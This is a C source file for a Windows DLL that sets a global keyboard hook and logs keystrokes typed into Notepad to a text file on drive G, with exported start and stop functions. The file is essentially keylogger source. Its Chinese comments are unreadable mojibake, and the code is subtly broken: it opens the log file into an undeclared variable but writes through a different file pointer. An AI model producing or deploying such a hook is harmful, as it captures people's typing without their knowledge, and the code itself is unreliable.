#include "stdio.h"
#include "windows.h"

HINSTANCE g_hInstance = NULL;
HHOOK g_hHook = NULL;
HWND g_hWnd = NULL;
FILE  *fp;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved){
	switch( dwReason ){
        case DLL_PROCESS_ATTACH:
			g_hInstance = hinstDLL;
			break;

        case DLL_PROCESS_DETACH:
			break;	
	}
	return TRUE;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
	char szPath[MAX_PATH] = {0,};
	char *p = NULL;
    //------------------------------------------
    char ch;
    //HWND h1 = GetForegroundWindow();
    //------------------------------------------

	if( HC_ACTION==nCode && (lParam&0x80000000)) {
		// bit 31 : 0 => press, 1 => release
			GetModuleFileNameA(NULL, szPath, MAX_PATH);
			p = strrchr(szPath, '\\');
            //�����ص�ǰDLL�Ľ��̵Ŀ�ִ���ļ�����Ϊnotepad.exe������Ϣ���ᴫ�ݸ���һ������
			if( !_stricmp(p + 1, "notepad.exe") ) {
				if( (wParam==VK_SPACE)||(wParam==VK_RETURN)||(wParam>=0x2f ) &&(wParam<=0x100) ) {
					f1 = fopen("G:\\input.txt","a+"); //��׷�ӵķ�ʽд��input.txt�ļ���
					 
					if(wParam == VK_RETURN) {
				 		ch = '\n';
				 		fwrite(&ch, 1, 1, fp);
					} else {
						BYTE ks[256];
						GetKeyboardState(ks);
				 		WORD w;
						UINT scan;
						scan = 0;
						ToAscii(wParam, scan, ks, &w, 0);
						ch = (char) w;
						fwrite(&ch, 1, 1, fp);
		 			}
				}
				
	
		 		fclose(fp);
    			//return 1;
			}
				
	}
    // ��ǰ���̲���notepad.exe������Ϣ���ݸ���һ������
	return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

#ifdef __cplusplus
extern "C" {
#endif
	__declspec(dllexport) void HookStart() {
		fp=fopen("G:\\input.txt", "w+"); //��G��Ŀ¼������input.txt�ļ� 
	    fclose(fp);
		g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0);
	}

	__declspec(dllexport) void HookStop() {
		if( g_hHook ) {
			UnhookWindowsHookEx(g_hHook);
			g_hHook = NULL;
		}
	}
#ifdef __cplusplus
}
#endif
